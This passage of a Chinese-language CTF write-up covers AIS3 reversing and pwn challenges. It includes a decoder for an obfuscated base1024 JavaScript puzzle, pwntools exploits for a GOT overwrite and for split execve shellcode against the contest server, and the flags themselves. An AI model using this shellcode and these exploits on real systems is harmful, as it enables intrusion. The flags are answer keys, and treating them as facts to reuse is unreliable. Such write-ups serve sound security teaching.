TAuOC0xNCwyMS4xLTIzIGM1LjYtNC45LDExLTEyLjQsMTQuNS0yNiAiPjwvYW5pbWF0ZT48L3BhdGg+PHBhdGggaWQ9ImJlYWsiIGZpbGw9IiM3YjhjNjgiPjxhbmltYXRlIGF0dHJpYnV0ZU5hbWU9ImQiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IiBNNzguMjksNzBjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzc4LjI5LDg1LjUsNzguMjksNzBaOyBNNjIuMjksNjRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzYyLjI5LDc5LjUsNjIuMjksNjRaOyBNNDguMjksNjdjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQ4LjI5LDgyLjUsNDguMjksNjdaOyBNMzYuMjksNzNjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM2LjI5LDg4LjUsMzYuMjksNzNaOyBNMzUuMjksNzVjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM1LjI5LDkwLjUsMzUuMjksNzVaOyBNNDEuMjksODFjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQxLjI5LDk2LjUsNDEuMjksODFaOyBNNTkuMjksODRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzU5LjI5LDk5LjUsNTkuMjksODRaOyBNNzIuMjksODljMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzcyLjI5LDEwNC41LDcyLjI5LDg5WjsgTTgwLjI5LDgyYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4MC4yOSw5Ny41LDgwLjI5LDgyWjsgTTg3LjI5LDc4YzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4Ny4yOSw5My41LDg3LjI5LDc4WjsgTTc4LjI5LDcwYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M3OC4yOSw4NS41LDc4LjI5LDcwWiAiPjwvYW5pbWF0ZT48L3BhdGg+PGVsbGlwc2UgaWQ9ImV5ZS1yaWdodCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iMTAwOzg0OzcwOzU4OzU3OzYzOzgxOzk0OzEwMjsxMDk7MTAwIj48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjxlbGxpcHNlIGlkPSJleWUtbGVmdCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iNjcuNTs1MS41OzM3LjU7MjUuNTsyNC41OzMwLjU7NDguNTs2MS41OzY5LjU7NzYuNTs2Ny41Ij48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjwvc3ZnPjwvZGl2Pg==", 
"131837PcDnWL", "19pQimXL", "623605MIswVM", "charCodeAt", "join", "4WsUYDr", "686oWrfyq", "body", "map", "getElementById", "textContent", "match", "key", "302349wKdZHP", "4OYJFlQ", "input", "padStart", "Backspace"];
/**
 * @param {number} url
 * @param {?} whensCollection
 * @return {?}
 */
function _0x4ebd(url, whensCollection) {
  /** @type {number} */
  url = url - 454;
  let ret = arr[url];
  return ret;
}
(function(data, oldPassword) {
  for (; !![];) {
    try {
      const userPsd = -parseInt(_0x4ebd(486)) + parseInt(_0x4ebd(462)) * -parseInt(_0x4ebd(478)) + -parseInt(_0x4ebd(475)) + -parseInt(_0x4ebd(487)) * parseInt(_0x4ebd(471)) + -parseInt(_0x4ebd(469)) * parseInt(_0x4ebd(457)) + parseInt(_0x4ebd(479)) * -parseInt(_0x4ebd(466)) + parseInt(_0x4ebd(473)) * parseInt(_0x4ebd(474));
      if (userPsd === oldPassword) {
        break;
      } else {
        data["push"](data["shift"]());
      }
    } catch (_0xe36f7) {
      data["push"](data["shift"]());
    }
  }
})(arr, 359030), (() => {
  /**
   * @param {?} params
   * @return {?}
   */
  function init(params) {
    if (!params["length"]) {
      return "";
    }
    let a = "";
    let ipv6 = "";
    let frameNumber = 0;
    for (let i = 0; i < params["length"]; i++) {
      a = a + params["charCodeAt"](i)["toString"](2)["padStart"](8, "0");
    }
    /** @type {number} */
    frameNumber = a["length"] % max / 2 - 1;
    if (frameNumber != -1) {
      a = a + "0"["repeat"](max - a["length"] % max);
    }
    a = a["match"](/(.{1,10})/g);
    for (let x of a) {
      let pivot = parseInt(x, 2);
      ipv6 = ipv6 + wrap(pivot >> 6 & 7, pivot >> 9, atob(wpoStr)[pivot & 63]);
    }
    for (; frameNumber > 0; frameNumber--) {
      ipv6 = ipv6 + wrap(frameNumber % fps, 0, "=");
    }
    return ipv6;
  }


  const importSave = "PGRpdiBzdHlsZT0id2lkdGg6IDM1MHB4OyBwb3NpdGlvbjogYWJzb2x1dGU7IGJvdHRvbTogMHB4OyBsZWZ0OiAwcHg7Ij48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGFuaW1hdGlvbjogcmFpbmJvdyAycyBsaW5lYXIgMHMgaW5maW5pdGUgbm9ybWFsOyBwb3NpdGlvbjogYWJzb2x1dGU7IHRvcDogLTEwcHg7IGxlZnQ6IDUwJTsgZm9udC1zaXplOiAyMHB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSk7IHdpZHRoOiAzNTBweDsiPkhlcmUgaXMgeW91cjxicj4iZW5jb2RlZCIgZmxhZyw8YnI+aW5wdXQgdG8gZW5jb2RlIHNvbWV0aGluZyBlbHNlITwvZGl2PiA8c3ZnIGlkPSLwn5CIIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIHN0cm9rZT0iIzAwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwYXRoIGlkPSJib2R5Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJmaWxsIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgI2ZmOGQ4YjsgI2ZlZDY4OTsgIzg4ZmY4OTsgIzg3ZmZmZjsgIzhiYjVmZTsgI2Q3OGNmZjsgI2ZmOGNmZjsgI2ZmNjhmNzsgI2ZlNmNiNzsgI2ZmNjk2ODsgI2ZmOGQ4YiAiPjwvYW5pbWF0ZT48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJkIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgTTY3LjEsMTA5LjVjLTkuNiwwLTIzLjYtOC44LTIzLjYtMjRjMC0xMi4xLDE3LjgtNDEsMzcuNS00MWMxNS42LDAsMjMuMywxMC42LDI1LjEsMjAuNSBjMS45LDEwLjcsMy45LDguMiwzLjksMTkuNWMwLDguMi0zLjgsMTctMy44LDIyLjNjMCwzLjksMS40LDcuNCwyLjksMTAuNWMxLjcsMy41LDIuNCw2LjYsMi40LDkuMkg5LjVjMC0xMy43LDEwLjgtMTQsMjEuMS0yMyBjNS42LTQuOSwxMS0xMi40LDE0LjUtMjY7IE01Ni4xLDEwNy41Yy05LjYsMC0yNC42LTEzLjgtMjQuNi0yOWMwLTE2LjIsMTMtNDIsMzMuNS00MmMxNy44LDAsMjIuMywxMS42LDI2LjEsMjIuNSBjMy42LDEwLjMsOS45LDkuMiw5LjksMjAuNWMwLDguMi0xLjgsNy0xLjgsMTIuM2MwLDQuNSwzLjQsOC4yLDYuNCwxNC4xYzIuNSw0LjgsNC44LDExLjIsNC44LDIwLjZoLTk5YzAtMTIuMSw3LjItMTcuNiwxNC43LTI0LjMgYzMuMi0yLjksNi41LTUuOSw5LjItOS44OyBNNDUuMSwxMDkuNWMtNS41LTAuMi0yNy42LTguNC0yNy42LTI3YzAtMTcuOSwxNC44LTQyLDMyLjUtNDJjMTUuNCwwLDI0LDEwLjQsMjYuMSwyMS41IGMxLjMsNi43LDkuOSw5LjgsOS45LDIxLjVjMCw4LjItMC44LDYtMC44LDExLjNjMCw3LjcsMTIuOCw5LDIwLjgsMTVjNy43LDUuOCwxNS41LDE2LjcsMTUuNSwxNi43aC0xMTBjMC00LjgsMS43LTExLjMsNS0xNiBjMy4yLTQuNSw0LjUtOC4zLDUtMTU7IE0zNiwxMjBjLTUuNS0wLjItMjguNS0xMS45LTI4LjUtMzAuNWMwLTE2LjIsMTIuNS00MiwzMy00MmMxNy44LDAsMjEuOCw5LjYsMjUuNiwyMC41IEM2OS43LDc4LjMsNzYsNzguMiw3Niw4OS41YzAsOC4yLTAuOCw0LTAuOCw5LjNjMCw1LjksMTYuNSw3LjgsMjguNCwxNS45YzgsNS41LDE3LjksMTEuOCwxNy45LDExLjhoLTExMGMwLTIuMS0xLjItNS4yLTEuOS0xNC41IGMtMC4zLTMuNi0wLjUtOC4xLTAuNS0xMy45OyBNMzcsMTE5LjVjLTE1LDAuMS0zMy41LTEyLjctMzMuNS0zMEMzLjUsNzMuMywxNiw0NywzNi41LDQ3YzE3LjgsMCwyMi44LDExLDI2LDIyIEM2NS42LDc5LjQsNzMsNzkuMiw3Myw5MC41YzAsNC0xLjgsNi42LTEuOCw4LjNjMCw1LjksMTQuMiw2LjQsMjYuNCwxNS45YzcuNyw2LDEzLjksMTEuOCwxMy45LDExLjhINy41Yy0xLjItMy40LTEuOC03LjMtMS45LTExLjIgYy0wLjItNS4xLDAuMy0xMC4xLDAuOS0xMy43OyBNNDAuNSwxMjEuNWMtMTIuNiwwLTMwLTEzLjQtMzAtMjlDMTAuNSw3Ni4zLDIzLDUzLDQzLjUsNTNjMTQuNSwwLDIyLjgsOS42LDI1LDIyIGMxLjIsNi45LDEwLDkuMiwxMCwyMC41YzAsNCwwLDUuNiwwLDcuM2MwLDQuOSw2LjEsNy41LDExLjIsMTEuOWM1LjgsNSw3LjIsMTEuOCw3LjIsMTEuOEg4LjVjMC0xLjUtMC42LTYuMSwwLjQtMTEuOCBjMC42LTMuNSwxLjktNy41LDQuMy0xMS42OyBNNDguNSwxMjEuNWMtMTIuNiwwLTI1LTYuMy0yNS0xOGMwLTE2LjIsMTMuNy00NywzNi00N2MxNS42LDAsMjQuOCw5LjEsMjcsMjEuNSBjMS4yLDYuOSw3LDkuMiw3LDE4LjVjMCw5LjUtNCwxMS00LDIyYzAsNC4xLDAuNSw1LDEsNmMwLjUsMS4yLDEsMiwxLDJoLTgxYzAtNS4zLDMuMS04LjMsNi4zLTExLjVjMi42LTIuNiw1LjQtNS4zLDYuNy05LjU7IE02OC41LDEyMS41Yy0xMi42LDAtMzMtNS44LTMzLTIzYzAtOS4yLDExLjgtMzYsMzctMzZjMTUuNiwwLDI1LjgsOC4xLDI4LDIwLjUgYzEuMiw2LjksNCw2LjIsNCwxNS41YzAsOS41LTUsMTUuMS01LDIxYzAsMS45LDEsMi4zLDEsNWMwLDEuMiwwLDIsMCwyaC05MWMwLjUtNy42LDcuMS0xMS4xLDEzLjctMTUuN2M0LjktMy40LDkuOS03LjUsMTIuMy0xNC4zOyBNNzMuNSwxMTcuNWMtMTIuNiwwLTMwLTYuMi0zMC0yNWMwLTE0LjIsMjAuOS0zNywzOC0zN2MxNy42LDAsMjUuOCwxMS4xLDI4LDIzLjUgYzEuMiw2LjksMyw3LjIsMywxNi41YzAsMTIuMS02LDE2LjEtNiwyMmMwLDQuMiwyLDUuMywyLDhjMCwxLjIsMCwxLDAsMUg3LjVjMi4xLTkuNCwxMC40LTEzLjMsMTkuMi0xOS40IGM3LjEtNSwxNC40LTExLjUsMTguOC0yMy42OyBNODAuNSwxMTUuNWMtMTIuNiwwLTMyLTkuMi0zMi0yOGMwLTE0LjIsMjIuOS0zNSw0MC0zNWMxNy42LDAsMjUuOCwxMi4xLDI4LDI0LjUgYzEuMiw2LjksMyw2LjIsMywxNS41YzAsMTIuMS02LDE5LjEtNiwyNWMwLDQuMiwyLDUuMywyLDhjMCwxLjIsMCwxLDAsMWgtMTAyYzIuMy04LjcsMTEuNi0xMS43LDIwLjgtMjAuMSBjNS4zLTQuOCwxMC41LTExLjQsMTQuMi0yMS45OyBNNjcuMSwxMDkuNWMtOS42LDAtMjMuNi04LjgtMjMuNi0yNGMwLTEyLjEsMTcuOC00MSwzNy41LTQxYzE1LjYsMCwyMy4zLDEwLjYsMjUuMSwyMC41IGMxLjksMTAuNywzLjksOC4yLDMuOSwxOS41YzAsOC4yLTMuOCwxNy0zLjgsMjIuM2MwLDMuOSwxLjQsNy40LDIuOSwxMC41YzEuNywzLjUsMi40LDYuNiwyLjQsOS4ySDkuNWMwLTEzLjcsMTAuOC0xNCwyMS4xLTIzIGM1LjYtNC45LDExLTEyLjQsMTQuNS0yNiAiPjwvYW5pbWF0ZT48L3BhdGg+PHBhdGggaWQ9ImJlYWsiIGZpbGw9IiM3YjhjNjgiPjxhbmltYXRlIGF0dHJpYnV0ZU5hbWU9ImQiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IiBNNzguMjksNzBjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzc4LjI5LDg1LjUsNzguMjksNzBaOyBNNjIuMjksNjRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzYyLjI5LDc5LjUsNjIuMjksNjRaOyBNNDguMjksNjdjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQ4LjI5LDgyLjUsNDguMjksNjdaOyBNMzYuMjksNzNjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM2LjI5LDg4LjUsMzYuMjksNzNaOyBNMzUuMjksNzVjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzM1LjI5LDkwLjUsMzUuMjksNzVaOyBNNDEuMjksODFjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzQxLjI5LDk2LjUsNDEuMjksODFaOyBNNTkuMjksODRjMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzU5LjI5LDk5LjUsNTkuMjksODRaOyBNNzIuMjksODljMC05LjkyLDIuNS0xNCw4LTE0czgsMi4xNyw4LDEwLjY3YzAsMTUuOTItNywyNi4zMy03LDI2LjMzUzcyLjI5LDEwNC41LDcyLjI5LDg5WjsgTTgwLjI5LDgyYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4MC4yOSw5Ny41LDgwLjI5LDgyWjsgTTg3LjI5LDc4YzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M4Ny4yOSw5My41LDg3LjI5LDc4WjsgTTc4LjI5LDcwYzAtOS45MiwyLjUtMTQsOC0xNHM4LDIuMTcsOCwxMC42N2MwLDE1LjkyLTcsMjYuMzMtNywyNi4zM1M3OC4yOSw4NS41LDc4LjI5LDcwWiAiPjwvYW5pbWF0ZT48L3BhdGg+PGVsbGlwc2UgaWQ9ImV5ZS1yaWdodCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iMTAwOzg0OzcwOzU4OzU3OzYzOzgxOzk0OzEwMjsxMDk7MTAwIj48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjxlbGxpcHNlIGlkPSJleWUtbGVmdCIgcng9IjMiIHJ5PSI0Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJjeCIgZHVyPSI1MDBtcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiIGtleVRpbWVzPSIwOzAuMTswLjI7MC4zOzAuNDswLjU7MC42OzAuNzswLjg7MC45OzEiIHZhbHVlcz0iNjcuNTs1MS41OzM3LjU7MjUuNTsyNC41OzMwLjU7NDguNTs2MS41OzY5LjU7NzYuNTs2Ny41Ij48L2FuaW1hdGU+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iY3kiIGR1cj0iNTAwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBrZXlUaW1lcz0iMDswLjE7MC4yOzAuMzswLjQ7MC41OzAuNjswLjc7MC44OzAuOTsxIiB2YWx1ZXM9IjYyOzU2OzU5OzY1OzY3OzczOzc2OzgxOzc0OzcwOzYyIj48L2FuaW1hdGU+PC9lbGxpcHNlPjwvc3ZnPjwvZGl2Pg==";
  const encodedChallengeObject = "NDBCMjBnMzBpNTFKNjA2MDFcMzB3NDAxMzBBNDFqNDBcNDExMzBnNzB1MzBpMTBrMzBsNDA3NjB4NTBpNTBYMTBLMTBJNDBoNTBYMDBLNDFpNTFsNzA2NzBmNDBvMTA2NTA1NzBLMTFuNTE4NzA3NDFCNTAtMTE4NDB3MzFhMTByNDF6NzBLMzA9MjA9MTA9";
  const wpoStr = "QWxTM3tCYXNFNjRfaTUrYjByTkluZ35cUXdvLy14SDhXekNqN3ZGRDJleVZrdHFPTDFHaEtZdWZtWmRKcFg5fQ==";
  const fps = 8;
  const max = 10;
  let obj;
  let hour = 0;
  let wrap = (tag, expressions, fn) => {
    return '<span><div class="c' + tag + " r" + expressions + '">' + fn + "</div></span>";
  };
  let create = (str) => {
    return document["getElementById"]("output")["innerHTML"] = init(str);
  };




  document["addEventListener"]("keydown", (result) => {
    if (result["key"] === "Backspace" && hour == 10) {
      obj["textContent"] = obj["textContent"]["substr"](0, obj["textContent"]["length"] - 1);
    } else {
      if (result["key"] === "ArrowUp" && !(hour >> 1)) {
        return hour = hour + 1;
      } else {
        if (result["key"] === "ArrowDown" && !(hour >> 2)) {
          return hour = hour + 1;
        } else {
          if (result["key"] === "ArrowLeft" && (hour == 4 || hour == 6)) {
            return hour = hour + 1;
          } else {
            if (result["key"] === "ArrowRight" && (hour == 5 || hour == 7)) {
              return hour = hour + 1;
            } else {
              if (result["key"] === "b" && hour == 8) {
                return hour = hour + 1;
              } else {
                if (result["key"] === "a" && hour == 9) {
                  return document["getElementsByTagName"]("body")[0]["innerHTML"] += atob(importSave), 
                  obj = document["getElementById"]("input"), obj["innerHTML"] = "", 
                  document["getElementById"]("output")["innerHTML"] = atob(encodedChallengeObject)["match"](/(.{1,3})/g)["map"]((clean) => {
                                                                            return wrap(clean[0], clean[1], clean[2]);
                                                                          })["join"](""), 
                  hour = hour + 1;
                } else {
                  if (result["key"]["length"] == 1 && hour == 10) {
                    obj["textContent"] += String["fromCharCode"](result["key"]["charCodeAt"]());
                  } else {
                    return;
                  }
                }
              }
            }
          }
        }
      }
    }
    create(obj["textContent"]);
  });

})();
```

大致分成兩 part
第一 part 是輸入神秘按鍵解鎖達到第二 part

神秘按鍵就是 : `上上下下左右左右ba`

接著第二關
他說他已經把 flag 加密了
如果我們輸入 "對的東西 就會得到對的加密"

意思就是只知道 flag 加密後的樣子

看一下 code 理解後發現是 base1024
於是就自己寫一下 code 來解密

- exp.py
```python=
import string

maps = 'AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}'
goals = ['40B', '20g', '30i', '51J', '606', '01\\', '30w', '401', '30A', '41j', '40\\', '411', '30g', '70u', '30i', '10k', '30l', '407', '60x', '50i', '50X', '10K', '10I', '40h', '50X', '00K', '41i', '51l', '706', '70f', '40o', '106', '505', '70K', '11n', '518', '707', '41B', '50-', '118', '40w', '31a', '10r', '41z', '70K', '30=', '20=', '10=']

ls = list()
for goal in goals:
	check = False
	for i in range(len(maps)):
		if goal[2] == maps[i]:
			check = True
			ls.append(i)
	if not check:
		ls.append(0)

flag = ''
for i in range(len(ls)):
	tmp = ls[i]
	while tmp < 1024:
		if tmp >> 6 & 7 == int(goals[i][0]) and tmp >> 9 == int(goals[i][1]):
			b = bin(tmp)[2:]
			pad = 10 - len(b)
			for i in range(pad):
				b = '0' + b
			flag += b
			break
		tmp += 64

flag = bytes.fromhex(hex(int(flag, 2))[2:])
print(flag)
```

- flag : `AIS3{base1024_15_c0l0RFuL_GAM3_CL3Ar_thIS_IS_y0Ur_FlaG!}`

---

# Pwn

## Write Me

題目把 `system()` 的 got 表給覆寫成 `0x0` 了
稍微找一下原本 system 的 got 指向哪
然後還原即可

- exp.py
```python=
from pwn import *

host = 'quiz.ais3.org'
port = 10102

r = remote(host, port)

r.recvuntil('Address: ')
r.sendline(str(0x404028))
r.recvuntil('Value: ')
r.sendline(str(0x0000000000401050))
print(r.recv())
r.interactive()
```

- flag : `AIS3{Y0u_know_h0w_1@2y_b1nd1ng_w@rking}`

## noper

這題也蠻酷的
題目隨機在我們的 shell code 位置塞上 nop
但因為是偽隨機 所以其實是固定的 (汗
首先就先 parse 看看在哪幾個位置會被塞

得出的 offset 是這幾個
```
06
0a
0d
11
27
29
2c
33
3f
```

接著就開始分割我們的 shell code 塞進足夠的位置
我用的是這個 27 bytes 的 [shell code](http://shell-storm.org/shellcode/files/shellcode-806.php) 然後分成兩段

- exp.py
```python=
from pwn import *

host = 'quiz.ais3.org'
port = 5002

r = remote(host, port)

code = [ 0x90 for i in range(64) ]
part1 = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99'
part2 = b'\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

for i in range(len(part1)):
    code[18 + i] = part1[i]
for i in range(len(part2)):
    code[52 + i] = part2[i]

r.recvuntil('Give me some code:')
r.sendline(bytes(code))
r.interactive()

```
